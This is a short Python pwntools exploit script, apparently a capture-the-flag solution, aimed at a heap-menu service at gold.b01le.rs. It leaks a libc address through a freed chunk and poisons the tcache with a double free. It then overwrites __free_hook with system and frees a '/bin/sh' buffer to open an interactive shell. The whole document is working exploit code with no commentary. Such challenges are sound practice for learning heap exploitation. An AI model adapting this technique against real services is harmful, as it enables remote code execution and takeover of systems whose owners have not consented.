from pwn import *
import time

libc = ELF('./libc.so.6')
r = remote('gold.b01le.rs', 4001)

def alloc(idx, size):
    r.sendlineafter(b'Resize----\n', b'1')
    r.sendlineafter(b'Where? ', idx)
    r.sendlineafter(b'size? ', size)

def free_view(choice, idx):
    r.sendlineafter(b'Resize----\n', choice)
    r.sendlineafter(b'Where? ', idx)

def edit(idx, msg):
    r.sendlineafter(b'Resize----\n', b'4')
    r.sendlineafter(b'Where? ', idx)
    r.sendlineafter(b'size? ', b'10')
    time.sleep(0.5)
    r.sendline(msg)

alloc(b'0', b'20')
alloc(b'1', b'1104')
alloc(b'2', b'20')
alloc(b'3', b'10')
free_view(b'2', b'1')
free_view(b'3', b'1')
leak = u64(r.recvline().strip().ljust(8, b'\x00'))
print(hex(leak))
libc.address = leak - 0x3AFCA0
print(hex(libc.address))
print(hex(libc.symbols['__free_hook']))
alloc(b'4', b'30')
alloc(b'5', b'30')
free_view(b'2', b'4')
free_view(b'2', b'4')
alloc(b'4', b'30')
edit(b'4', p64(libc.symbols[b'__free_hook']))
alloc(b'6', b'30')
alloc(b'7', b'30')
edit(b'7', p64(libc.symbols[b'system']))
alloc(b'8', b'30')
edit(b'8', b'/bin/sh\x00')
free_view(b'2', b'8')

r.interactive()
